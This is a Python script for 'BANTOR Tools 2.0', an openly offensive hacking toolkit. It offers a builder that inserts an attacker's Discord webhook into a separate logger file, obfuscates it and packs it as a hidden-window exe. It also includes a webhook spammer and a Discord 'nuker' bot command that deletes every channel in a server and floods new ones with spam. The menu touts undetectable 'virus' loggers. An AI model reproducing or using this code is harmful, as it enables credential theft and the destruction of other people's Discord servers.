from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time
import discord
from discord.ext import commands
import socket
import re
successfullywebhookspamcheck = "1"
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prOrange(skk):print("\033[95m {}\033[00m".format(skk))
os.system('clear' if os.name == 'posix' else 'cls')



ping_output = subprocess.check_output(["ping", "-n", "4", "localhost"]).decode()

avg_rtt = re.search(r"Average = (\d+)", ping_output)
if avg_rtt:
    ping_status = f"{avg_rtt.group(1)}ms"
else:
    ping_status = "None/Unknown/Error"



def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address
PremiumCheck = "false"
ip = get_ip_address()
if ip == "202.86.172.163" or "192.168.48.145":
    PremiumCheck = "true"
else :
    PremiumCheck = "false"

intro = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ____          _   _ _______ ____  _____         _____             __ _           
           |  _ \   /\   | \ | |__   __/ __ \|  __ \       / ____|           / _(_)          
           | |_) | /  \  |  \| |  | | | |  | | |__) |_____| |     ___  _ __ | |_ _  __ _ ___ 
           |  _ < / /\ \ | . ` |  | | | |  | |  _  /______| |    / _ \| '_ \|  _| |/ _` / __|
           | |_) / ____ \| |\  |  | | | |__| | | \ \      | |___| (_) | | | | | | | (_| \__ \
           |____/_/    \_\_| \_|  |_|  \____/|_|  \_\      \_____\___/|_| |_|_| |_|\__, |___/





                > Press Enter To Begin BANTOR the "2.0"                                       
"""

Anime.Fade(Center.Center(intro), Colors.green_to_blue, Colorate.Vertical, interval=0.035, enter=True)


Logo = """
  ____          _   _ _______ ____  _____         _____             __ _           
 |  _ \   /\   | \ | |__   __/ __ \|  __ \       / ____|           / _(_)          
 | |_) | /  \  |  \| |  | | | |  | | |__) |_____| |     ___  _ __ | |_ _  __ _ ___ 
 |  _ < / /\ \ | . ` |  | | | |  | |  _  /______| |    / _ \| '_ \|  _| |/ _` / __|
 | |_) / ____ \| |\  |  | | | |__| | | \ \      | |___| (_) | | | | | | | (_| \__ \
 |____/_/    \_\_| \_|  |_|  \____/|_|  \_\      \_____\___/|_| |_|_| |_|\__, |___/
                                                                          __/ |    
                                                                         |___/     


            Welcome to Builder
            Loaded Successfully ! 
            Made by BANTOR-Configs Team

            Your PC Check : Fast
            FPS : High
            Virus : None
            Alpha : True
            VPN : Undefind
            Proxy : Undefind
            Press Enter To Choose your Option __>
"""

Anime.Fade(Center.Center(Logo), Colors.blue_to_purple, Colorate.Vertical, interval=0.035, enter=True)

DeBug = input("Enbled Auto Debug (y/n)")
if DeBug == "y":
    os.system('cls')
    prOrange("Enbled Auto Debug")
elif DeBug == "n":
    os.system('cls')
    prOrange("Disabled AutoDeBug")
else:
    Write.Print("You've Entered Invald.",Colors.red_to_yellow)
time.sleep(1)
while True:
    prGreen("\nBANTOR Tools 2.0 | Developers : BANTOR-Configs Team")
    print("\033[95m [+]\033[00m Your Premium Status :",PremiumCheck,"\n\033[95m [+]\033[00m Your IP  : ",ip,"\n\033[95m [+]\033[00m Whitelist Status:",PremiumCheck)
    print("\033[95m [+]\033[00m Your Ping Status:",ping_status)
    print('\033[94m [/] ⚠️Change Note : BANTOR 2.0 Added Title & Webhook/EasterEggs also Premium Features Full Release Note on Discord\033[00m  ')
    print("\033[95m -----------https://bantor-configs.github.io----------------------------------------------------------------------------------- \033[00m")
    bantor = """
  ____          _   _ _______ ____  _____         _____             __ _           
 |  _ \   /\   | \ | |__   __/ __ \|  __ \       / ____|           / _(_)          
 | |_) | /  \  |  \| |  | | | |  | | |__) |_____| |     ___  _ __ | |_ _  __ _ ___ 
 |  _ < / /\ \ | . ` |  | | | |  | |  _  /______| |    / _ \| '_ \|  _| |/ _` / __|
 | |_) / ____ \| |\  |  | | | |__| | | \ \      | |___| (_) | | | | | | | (_| \__ \
 |____/_/    \_\_| \_|  |_|  \____/|_|  \_\      \_____\___/|_| |_|_| |_|\__, |___/
                                                                          __/ |    
                                                                         |___/     
    """

    prOrange(bantor)

    
    Write.Print("\nPlease Choose a option on BANTOR-Configs Tools  ", Colors.red_to_yellow)
    Write.Print("\n[1] Build exe Virus Logger", Colors.blue_to_purple)
    Write.Print("               [2] Build FUD exe Logger (Virus programs undetected !)", Colors.blue_to_purple)
    Write.Print("\n[3] Close", Colors.blue_to_purple)
    Write.Print("   [4] Discord Support Server", Colors.red_to_purple)
    Write.Print("   [5] Secret Present",Colors.red_to_black)
    Write.Print("\n[6] Webhook spammer Main",Colors.blue_to_purple)
    if PremiumCheck == "true":
        Write.Print("\n[7] Discord Nuker (Premium)",Colors.blue_to_purple)
    Write.Print("\nPlease Make your selection: ", Colors.red_to_yellow, end="")
    
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nWebhook Link: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.blue_to_purple)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.blue_to_purple)
                break
            elif answer.upper() == "N":
                break
            elif answer.upper() == "Private":
                os.system('cls')
                Write.Print(f"\nWow ! , you got the easter egg from 2023.... , Proof this in to xylexvxpe to get whitelisted !",Colors.blue_to_purple)
                break
            else:
                os.system('cls')
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                os.system('cls')
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nThanks you For Supporting Lunix Logger , But its Private Feature !", Colors.red_to_yellow)

    elif choice == "3":
            Lunix2 = """
  ____          _   _ _______ ____  _____         _____             __ _           
 |  _ \   /\   | \ | |__   __/ __ \|  __ \       / ____|           / _(_)          
 | |_) | /  \  |  \| |  | | | |  | | |__) |_____| |     ___  _ __ | |_ _  __ _ ___ 
 |  _ < / /\ \ | . ` |  | | | |  | |  _  /______| |    / _ \| '_ \|  _| |/ _` / __|
 | |_) / ____ \| |\  |  | | | |__| | | \ \      | |___| (_) | | | | | | | (_| \__ \
 |____/_/    \_\_| \_|  |_|  \____/|_|  \_\      \_____\___/|_| |_|_| |_|\__, |___/
                                                                          __/ |    
                                                                         |___/     

            Thanks For Supporting , Application Closed
            Made By BANTOR Configs Team
            """

            Anime.Fade(Center.Center(Lunix2), Colors.blue_to_purple, Colorate.Vertical, interval=0.035, enter=False)
    elif choice == "4":
        Write.Print("\nSupport Link : https://discord.gg/y66vx2U2PF", Colors.red_to_purple)
    elif choice == "5":
        Write.Print("\n Your're un lucky now , try soon 🤣",Colors.red_to_yellow)
    elif choice == "6":
        webhookURL = input("Enter the webhook URL: ")

        message = input("Enter the message to send: ")
        username = input("Enter bot username: ")

        message_data = {
            'content': message,
            'username': username,
        }
        if successfullywebhookspamcheck == "1":
            requests.post(webhookURL, json=message_data)
            successfullywebhookspamcheck = "2"
            
            Write.Print("\n Message Sent.",Colors.red_to_yellow)
        else:
            os.system('cls')
            Write.Print("\n Invald Webhook or Error ( you must add https:// )")
    elif choice == "7":
        if PremiumCheck == "true":
            intents = discord.Intents.default()
            intents.typing = False
            intents.presences = False
            bottoken = input("Please enter the Bot Token: ")
            prefix = input("Please enter the Bot Prefix: ")
            message = input("Please enter the Message to Spam: ")
            channelname = input("Please enter the Channel Name: ")
            Write.Print("\nPrefix will be '{}'".format(prefix),Colors.red_to_yellow)
            bot = commands.Bot(command_prefix=prefix, intents=intents)

            @bot.event
            async def on_ready():
                print("\nBot Waked Up By BANTOR")

            @bot.command()
            async def kill(ctx, num_channels: int, channelname: str, *, message: str):
                guild = ctx.guild
                for channel in guild.channels:
                    await channel.delete()
                for i in range(num_channels):
                    await guild.create_text_channel(f"{channelname}-{i+1}")
                for channel in guild.channels:
                    if isinstance(channel, discord.TextChannel):
                        await channel.send(message)

            bot.run(bottoken)
        else:
            Write.Print("\n This is Premium Feature , Not A Vaild Premium/Whitelisted User.",Colors.red_to_yellow)
    else:
        os.system('cls')
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
